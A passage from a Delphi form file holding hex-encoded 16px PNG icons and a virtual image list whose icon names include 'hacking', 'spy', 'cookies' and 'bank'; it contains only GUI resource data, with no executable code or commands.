              0A032313861444011A89E102BFD864B012502C80188189E90CF7AE5F61B87BFD
              2A888B81310C80A9004521886DEDEECD00C22036360C36009420B049E2129B59
              2AC290DEFD062C4D9C47C14A11044C3342040B0B9447361CBCF21F84416C2C4A
              C0428C60124A343434303DFBC97F1AC83502626CE88C14FB4773A0BA7FD824C9
              120300C6305086BA4E65AB0000000049454E44AE426082}
          end>
      end
      item
        Name = 'x64_16px'
        SourceImages = <
          item
            Image.Data = {
              89504E470D0A1A0A0000000D49484452000000100000001008060000001FF3FF
              6100000006624B474400FF00FF00FFA0BDA793000001254944415438116360A0
              103082F4FB556DFD0FA249C59BDABC199948D584AE7E901B2026C0C9E06020CD
              20C8CB0E77B9B2143F03071B339C8FD30B1A72820C91CEAA0C1FBFFE64606202
              873583940837437B9A0583083F27A601D12E6A0CCC4085FED68A60490F333986
              BBCF3E31C88AF2307CFDFE9B8195858921DE5D83E1FCEDD76079180177C1E99B
              AF18CA220D192EDE7D039613E06107DBCCCAC2CC1064ABC490EEABCD70FAC64B
              86FFC0089706BA04AC0848C00D00D9FEEBF73FB002A038C3BDE71F199EBFFDCA
              F0F2FD371097E1FEF34F0CFCDCEC0C62829C0CCAD2FC603110C1022218191918
              1425F918FA565F64F0043AFDE1CBCF0C2BF7DD6108B15766F8FBEF3FC3BAC3F7
              187EFCFA0B520A36F0F2BDB7603688006A656018E12911140E146100708F4DCE
              0676719D0000000049454E44AE426082}
          end>
      end
      item
        Name = 'console_16px'
        SourceImages = <
          item
            Image.Data = {
              89504E470D0A1A0A0000000D49484452000000100000001008060000001FF3FF
              6100000006624B474400FF00FF00FFA0BDA793000000BF4944415438116360A0
              1030AE3F7AE33F25663051A219A49705444CEE6C015124E3DCF21A068A5D405D
              0338B8D819C4A58549F20A8A0BF805791882D39C1994B564883604C580974FDF
              32AC98BA93C12DCC92C1C255972843500C00EBF8FF9FE1DFBFFF0CFFFF817904
              0916641562D2420CC1A9CE0C7BD79D62B875E921B2144E368A019FDE7F655837
              672FC3CB27EFE01A2A2625C2D9204647DE7C1005C72806FCF8F6930184E1B240
              06BA06A0100AC20C031469C21C8A3313612B08A800003B8630C956147C320000
              000049454E44AE426082}
          end>
      end
      item
        Name = 'antivirus_16px'
        SourceImages = <
          item
            Image.Data = {
              89504E470D0A1A0A0000000D49484452000000100000001008060000001FF3FF
              6100000006624B474400FF00FF00FFA0BDA793000002E0494441543811A5526B
              489351187ECEF9BE6D6E3A4DA74409CE0B8A61D68FCA4AD1CA0233BB4CCC7E85
              5D88FE9574A3C88235B52C427F09FD8930BAD04DB4650D8AB428355182C83213
              998696C8BC2DA7FBBE7D5BE77CC3F9C39FBD9CF77D9FE7792F070E87008B66B5
              5AC51E29ABDEA8D71C50FCFE2845F1132AD08040C9D45F8FD4B04ED77D86F5F8
              172700B240F656B4E4E9B5C2EBF8D8086DC99614AC4E8A012504FE40005F0727
              F0E4DD00465D73731EC9BBF545F59EAE853975C19E4B2FF37594BE395A944E0A
              B3CC0BB525B9A573080D8E3EBF2429D9CDD78A3EF1065A5AFA586BD0088E63BB
              572D19BED858CB7B425EB4C98C2385E9344C27B659AD56CA0BD49B1A5E1B1F1B
              AE29D890C0396CCFEBF173CC096E2393633CA19F719BBD5EC5851BCD5861D287
              7D96D75772410CD76B0F16E72673AC7A598E05B58E3B30EA0D20EC0D2A1AEBE0
              9E9FC5E982236A9D87E2BC14DC6AEE3DCE7085E85394C88CC418868327D1148F
              A8F00898628CC85E9381FE915F10A729B81EEC0078BFCF1F30712ECAB29F180D
              1A8E71E1E94DFC9E1E6737039B3333D0DEFB0539AB33F168E02D0EDD3E8F15CB
              E25053721691062D649F42F890A8D1D080DB239368A30E35FBCF720D979BEAD8
              CDC3C8CD5C8B6FC34E249856C26639A9D67898F148D0889443B07F42A77A9D13
              2AE1A1EFCF202666DD1877CDE041EB6BB826DC98F44CA90FC9EBDC79BF7A3D23
              D4E3F5353C7B3F1860583DF73BED28DF5186EAE2530053AB583EB1BD0CF73A9A
              D57A80694D1F9C98971495D3998FFA73A3AE59C9DEE104B74A4B39D2962782DB
              F2C8589E546E633A27F6762726FF068739A76D6DDB7CB31E39FFAEE347E055D7
              10D7427EA3F45C0873D0D2398C87AD0348494BE35475A246162C158E2C9D96B4
              B24F65D8979384747334E2A2C2303E3D8FEF4393B0770CC1E5F62139350D02A1
              E8EAEA969BAFEED28616B01DB0B2EFD9E35D7FDD68D01D9615C5E49514A2D308
              10040ACFBCCC5B824EA08844B8D258B5B33228FC47FC07408209CEEE2FE4DB00
              00000049454E44AE426082}
          end>
      end
      item
        Name = 'archive_folder_16px'
        SourceImages = <
          item
            Image.Data = {
              89504E470D0A1A0A0000000D49484452000000100000001008060000001FF3FF
              6100000006624B474400FF00FF00FFA0BDA7930000011A4944415438116360A0
              10304EAB72F98F6E063313635D7ACBEE6674716C7C1690A0AB99228802E39FBF
              FE329CBEFEBC7256AD3B635AF3CE26B0201E02EC026403406A5F7FF8C670FDE1
              BB7F3F7FFE6602F1F161B00B769FBA8FA2869B939DC1484791E9D3E71F0C576F
              3D62E0E7E562087037475103E22C5CB39F016C407C8823888F8237EC3CC9F0F1
              F337061D753906635D651439640E4E27826C0469BE72F31103C830644DC86CB0
              0B9005606C90268A5CE0E968C4C0C7C3C9F0E8E96B865FBFFEC0CCC5A0717AE1
              C5EB0F0C9FBE7C07E3176F3E60688409E0F4C217A066493141B03A101BCCC042
              E074818C9408C367A0219FBF7E6700B1B1E8050BE1740128EE83BD2CC18AF011
              385D804F13B21CD805A014852C48573600ABF65B08AB6337C20000000049454E
              44AE426082}
          end>
      end
      item
        Name = 'invisible_16px'
        SourceImages = <
          item
            Image.Data = {
              89504E470D0A1A0A0000000D49484452000000100000001008060000001FF3FF
              6100000006624B474400FF00FF00FFA0BDA793000002A64944415438119D536D
              485351187E77CF76CD2D59A90CD36C6EE5DC64B6143F426B3923149D0B174909
              651FEB4749FD49FAE1AFFA1316441F3F0A42322BC21C49D3100B310A2AD48CD4
              52985953CB36716DD36D6EF3EE9ECEBDA00441A087F3BCE79CE77D9FE71CCEE1
              009096AFAF5490614D9DE2C514F417EC3119D6E2807E4EDABD9B14EA7702C0ED
              C972D5D8CCA4DDBE1A23C17271AEC15444616C4B8C8B9E3B6F46A994487C8465
              C2A95C1E09D74D3391E003860D3795595EFCE6B865AC1870C4C5FA8AC657C3D4
              8593551AC6643E2E124B377334047DD330F5C5169A9D7C1FC50C7376DFA9AE66
              3E41026FD0D67610C5FB23F7E858E9012AE5B0E4D2B54790575C053F16379212
              80226D121C2BCB80458F1D867B1B034B219FD52DA12DD5D5D628E2C409C168EB
              0699DA986BBCBA3E4DA101C7BC187A3A1E833C43075B545960D04AA1BB6F0A0A
              B3359092514A7B9C234AA16F4EA7D871A81D9D366636C5C5CBCD39E597254818
              C3EF78B7DB01EA1C3DF43FBB01CE898F1049D2C3E0C80498772B81422248DA66
              88714F7F5026C78ECB2972FBB4408030609617F30103C4276F85B8C4145870CF
              80EBDB10B098907C9204522BA028968844A8A246DB81E6DD3AE22897A515D148
              4883D71F81CF5F7F41B6BE0A12E59930D0790772B3D2C150A081A5F0020C7635
              F8031E47D71BC7F6A3C86A1DC5C61A6D3BE59B5339277AD3A532B5282F4B056E
              4F00FA86C6C11F8CC0AE9D3A78DBDD0A322986D94FD78321BF8B5CA2A8B6AEEE
              F65FC726277BD9546EE96936F9477AAF84BCAE311C65C23CBCAE51FCB4A5215C
              5C5AC9D69F31DE24A52B9D7FC6951599F4B4EC4D10B0620B128A6B9948404928
              2CA425DF99A5C5FBB73A61D8E9C10F31C627065E3FEF2439F8C78023FF87BC92
              FD850296B52D9BACDA8033CF2FA92C01169E10E473EB3581FFC544F90746730D
              A8BAD7A2A40000000049454E44AE426082}
          end>
      end
      item
        Name = 'ios_photos_16px'
        SourceImages = <
          item
            Image.Data = {
              89504E470D0A1A0A0000000D49484452000000100000001008060000001FF3FF
              6100000006624B474400FF00FF00FFA0BDA793000003394944415438116D924D
              6C1B5510C7FFEFC3EB4DEC8DEDC6360E4840A38A564A73AB6AE260A324955557
              043814D40B444495800327902AD44B4F45F4C0014EA5A1F91007040521411A91
              56A275152708A4564A23F543144A451D0249EC6C1DAFF7E33DDE6E951C0AA3B7
              4FB3F3667E33F3E611E0FF65EA9D178619A563441D7BC21B7DED93E969A5FE67
              D12D8B3C7182560E1CE82D974A29DFC6081D1F7C3E971EC8F7A52961135072FE
              6C29F5C35871AF94F0B9CA02040009909F171666355DAF6842DC5928160FBBAE
              DB99492791C9A4A0F4E4C533A5C361F03B7A5B74FED2E48BB35B9000F0D3D050
              2F656C7FCFE06074777F7F54953E61D822C8106C119529149ACC0E1D8C164A2F
              4719E3D98B9F1EDAEB9F05005BD3AAC27168D334A11B0676E57291AE8683F5DF
              FEC41FABF7811DC0FE81627BC4E88059ABC1716CCAC1AADB80C2CCCCDF2ADFD1
              DB958AD5DCD808209233DC9DBF86ABBF2F813386881153C1EBF8A57CC112528C
              0EBCF9DD3F3E804C1D9B1A669C8EB9B69BEE58AD227377090887E13D66CB1656
              B0BC3384D8E39DB8A56964D36EC183865F55498CB115E1895105A7E3CF0EF675
              A6D465F9C4074BD751FDF66BD41A44B6ADDCDB9DCA0A7293E1068320CF74F720
              DEBD0F7DCA71796D2D7DF9DAD5092EA5A44A94E9E1BA6553DCDEB90F9EE7918D
              A77AC8B2BB8B34F52A896809C40D82F84337504A1412840B21472AB373936A54
              098B10A8F1808735D4E309DCAB376E788E87989E806909CC2F022D715DB5F117
              38E56B427823DB0FE2A3635347D428C7F3870A7A2C11C3E9CFBF47A8AD1D7523
              01C5C5AB470AA8D71AA894172DE179231FBEFDDC977E31C1184FBE7F3645283B
              932FE58360B366029E83F6A7F7C0D8918465B5609A9B88C523C8157A7542E967
              EF9EFE31B90D0839AC2BA46B329688AB5199B83C536EDCA706C2A90C3AD34FC0
              564F75EED2E2E603B3890E05E11A97C20E77F980A00509493E3EFEC5051A6259
              D776E0B9EE1B659EFC2A9FEFF77D70E5CA1CF63C197F455DF638E71CEA82173E
              389A2DAADE64D0020191EBA19B45A7D9C83565ABFBBD5323E794F37A7DC3445D
              3D2C46D9EAA9B7FACF11CBE9B65A76DF56B04F0F2AF09547BF978E9F1F26844C
              124224F1F0FA37270F4E3FEAE3FFFF0BEB25417947B866780000000049454E44
              AE426082}
          end>
      end
      item
        Name = 'bank_building_16px'
        SourceImages = <
          item
            Image.Data = {
              89504E470D0A1A0A0000000D49484452000000100000001008060000001FF3FF
              6100000006624B474400FF00FF00FFA0BDA793000001BC494441543811636460
              C00E026AB6293331324D05CAFEFFF7FF5FCE8616AFBB403606624417F16CD8C6
              C7F59FA595E1FFBF145555655690825BB7EFFE6664629CFD95E16FCDF606AF4F
              C87A40F2607E68C32AB65F7F784A9919992A6564A498B5349439D85859C172BF
              7EFF66B876E3EE8F274F9EFDFDCBF0AF8D8DF94BCFEA86B05F2049B001FED5DB
              7C999999660AF0F3F3E9EB6A70F3F27083E430F0E72F5F192E5EBEF1F5C3C78F
              9FFEFEFD97BEB1D56B330B48D5FFFFFF37FDF9F397E1CDDB770C7B0F1C0309E1
              C320D3417813501123139060D8D4E60D7649808F2B88CB20ABA409C62E36460C
              EE76460C72503E4812A606A607EC0290043AF632126470D3E367F80F943876F3
              33C3EAE36F812C4C84D300671D3E86C9DB5F30DC7BF983419817A73206B01730
              CD6560B8F8F01B43AC9D0883990A0FC3DBCF7FB029018BE13460D1C1D70C1B4E
              BF67F030146088B517052BC646E0749BAA0407C38DA7DF19BEFFFAC790EA2286
              4D2F580CA7013EC6820CCA4043FEFDFBCFB0F3E247B0626C044E03FAB73E6750
              93E460F8FB8F81E12E3020B169068981E3DFAF6A2B28B6407C9230282DC05D00
              4B20C49AB061CB6EB052B8013001B0280904000AE88BCEC7C35E170000000049
              454E44AE426082}
          end>
      end
      item
        Name = 'sort_by_follow_up_date_16px'
        SourceImages = <
          item
            Image.Data = {
              89504E470D0A1A0A0000000D49484452000000100000001008060000001FF3FF
              6100000006624B474400FF00FF00FFA0BDA793000001584944415438116348AB
              ECFFCF8003F8566D6B6160F8CF884D3A0DAA8F099B244C8C91E17F7550ED8E2D
              0E0DFB396062E8345E03408AF9F9059C84FEFDDA13DAB09F07C447C72CC8027E
              555B31BCA3A9A5C171E7CE5DE3D7AFDF9C0A6CD8E9B0BEC1FD15B21E14034012
              B6B6D6200A05ABAAAA707CFDFA4DE5CB97AFCB80122E400C472C70169471F8F0
              51280B42D9D85831005DF0E3DBB76F0FFFFFFF150D11459028066C6AF3460971
              9097AE5EBBFEE5F3878F977EB0FCF7DCDEECFF09A115C242310022844A7EFEFC
              790BF3CDCF31DB5787FD459581F0F01AC0C8C0D8B9AED1AD92818111237021DA
              1918F01AB0B1CDAB02A610170D360096AA7029225B9C188309A64442B6A3441B
              4C716A65DF1C600026C3F80C8C0C7366B515A6C2F9480CAC2E9066FF940154B3
              078819FE33FCDFF6FEB634880FE26260660C11A0C0810307FE99D9F86F6160FA
              A7C6CECE1C3B7F5AD20FA03056040002336CD1D02E543D0000000049454E44AE
              426082}
          end>
      end
      item
        Name = 'folder_16px'
        SourceImages = <
          item
            Image.Data = {
              89504E470D0A1A0A0000000D49484452000000100000001008060000001FF3FF
              6100000006624B474400FF00FF00FFA0BDA793000000934944415438116360A0
              10304EAB72F98F6E063313635D7ACBEE6674716C7C1690A0AB99228802E39FBF
              FE329CBEFEBC7256AD3B635AF3CE26B0201E02EC026403406A5F7FF8C670FDE1
              BB7F3F7FFE6602F1F161B00B769FBA8FA2869B939DC148479149455E8A818989
              11450E99B370CD7E06B001F1218EC8E224B1093A919069A30630300C83300027
              24508A2214DF349307002C4623F503AC64790000000049454E44AE426082}
          end>
      end
      item
        Name = 'Close_16px'
        SourceImages = <
          item
            Image.Data = {
              89504E470D0A1A0A0000000D49484452000000100000001008060000001FF3FF
              6100000006624B474400FF00FF00FFA0BDA793000001E7494441543811CD524D
              4FE250147D8FCAC847A342E206BA713714EBC03F69E9E848E257C69898B8989F
              306B976E46333193404C4C0C1FC6647E07AD68F8038CB202A3549002F5DC2A60
              63663DD3F4DEF7EE3DE79E7773DF63ECBFFACC4CE6BBA9EB3FFED61461C4798B
              4F8D028007B144E2ABE0F7FB2F390F2885C23667CC211C8E5797977F498B8BD9
              816DDB26E7D14FC5E237C27CE45C739CB0C3B9109C99998E25935F70D2A19B87
              43F1514C9657084328C08230F7C721EEEA3A43558FE38AB22A46A361ABD57ABA
              ADD54E203A154F24B2A1B9B90FED66D3AA5F5D9DA6CBE51DB700CE2340AD9A9A
              969714E573381209A0A0C3058185676783D877EBD7D767E952691375E3DF2340
              5987316EAA6A2EBEB4A48B91488872ED56EBB15EAD1652E5F2160A40A1EC8B4D
              66F0123322E0548B39CE8488BDCFE7B3087BA58D171AC838A08DA1EB87922CAF
              D31CD076C7EEF5FAD4C9B428CA6BF3F3D251ADF69B7823F308E02A8FE3B2BC81
              E290D56C3EA0EDDC7DA36160FA1F911321A240640122172381C93BD0B49FB8BE
              2C4E0B5877778F7F6860E7E77B44340421803740B713C25B593532997EAA54DA
              256C2C30E4FCC6EE74BAEDE1B08FAB3A49BF161329552C6E570683AE944CAEF7
              6DBB87E13428FFCE2AAABA5FD1B41C08989717A61CDE499E385EE45F47CFD5AE
              B9D8F05AD9790000000049454E44AE426082}
          end>
      end>
    Left = 624
    Top = 20
  end
  object VirtualImageList1: TVirtualImageList
    Images = <
      item
        CollectionIndex = 0
        CollectionName = 'send_letter_24px'
        Name = 'send_letter_24px'
      end
      item
        CollectionIndex = 1
        CollectionName = 'bank_16px'
        Name = 'bank_16px'
      end
      item
        CollectionIndex = 2
        CollectionName = 'black_ski_mask_16px'
        Name = 'black_ski_mask_16px'
      end
      item
        CollectionIndex = 3
        CollectionName = 'cookies_16px'
        Name = 'cookies_16px'
      end
      item
        CollectionIndex = 4
        CollectionName = 'detective_16px'
        Name = 'detective_16px'
      end
      item
        CollectionIndex = 5
        CollectionName = 'fingerprint_16px'
        Name = 'fingerprint_16px'
      end
      item
        CollectionIndex = 6
        CollectionName = 'hacking_16px'
        Name = 'hacking_16px'
      end
      item
        CollectionIndex = 7
        CollectionName = 'heic_filetype_16px'
        Name = 'heic_filetype_16px'
      end
      item
        CollectionIndex = 8
        CollectionName = 'hips_16px'
        Name = 'hips_16px'
      end
      item
        CollectionIndex = 9
        CollectionName = 'info_16px'
        Name = 'info_16px'
      end
      item
        CollectionIndex = 10
        CollectionName = 'information_16px'
        Name = 'information_16px'
      end
      item
        CollectionIndex = 11
        CollectionName = 'lock_16px'
        Name = 'lock_16px'
      end
      item
        CollectionIndex = 12
        CollectionName = 'mastercard_credit_card_16px'
        Name = 'mastercard_credit_card_16px'
      end
      item
        CollectionIndex = 13
        CollectionName = 'museum_16px'
        Name = 'museum_16px'
      end
      item
        CollectionIndex = 14
        CollectionName = 'processor_16px'
        Name = 'processor_16px'
      end
      item
        CollectionIndex = 15
        CollectionName = 'spy_16px'
        Name = 'spy_16px'
      end
      item
        CollectionIndex = 16
        CollectionName = 'system_information_16px'
        Name = 'system_information_16px'
      end
      item
        CollectionIndex = 17
        CollectionName = 'system_task_16px'
        Name = 'system_task_16px'
      end
      item
        CollectionIndex = 18
        CollectionName = 'up_squared_16px'
        Name = 'up_squared_16px'
      end
      item
        CollectionIndex = 19
        CollectionName = 'upload_16px'
        Name = 'upload_16px'
      end
      item
        CollectionIndex = 20
        CollectionName = 'video_card_16px'
        Name = 'video_card_16px'
      end
      item
        CollectionIndex = 22
        CollectionName = 'x64_16px'
        Name = 'x64_16px'
      end
      item
        CollectionIndex = 23
        CollectionName = 'console_16px'
        Name = 'console_16px'
      end
      item
        CollectionIndex = 21
        CollectionName = 'windows_client_16px'
        Name = 'windows_client_16px'
      end
      item
        CollectionIndex = 24
        CollectionName = 'antivirus_16px'
        Name = 'antivirus_16px'
      end
      item
        CollectionIndex = 25
        CollectionName = 'archive_folder_16px'
        Name = 'archive_folder_16px'
      end
      item
        CollectionIndex = 26
        CollectionName = 'invisible_16px'
        Name = 'invisible_16px'
      end
      item
        CollectionIndex = 27
        CollectionName = 'ios_photos_16px'
        Name = 'ios_photos_16px'
      end
      item
        CollectionIndex = 28
        CollectionName = 'bank_building_16px'
        Name = 'bank_building_16px'
      end
      item
        CollectionIndex = 29
        CollectionName = 'sort_by_follow_up_date_16px'
        Name = 'sort_by_follow_up_date_16px'
      end
      item
        CollectionIndex = 30
        CollectionName = 'folder_16px'
        Name = 'folder_16px'
      end
      item
        CollectionIndex = 31
        CollectionName = 'Close_16px'
        Name = 'Close_16px'
      end>
    ImageCollection = ImageCollection1
    Left = 608
    Top = 76
  end
end
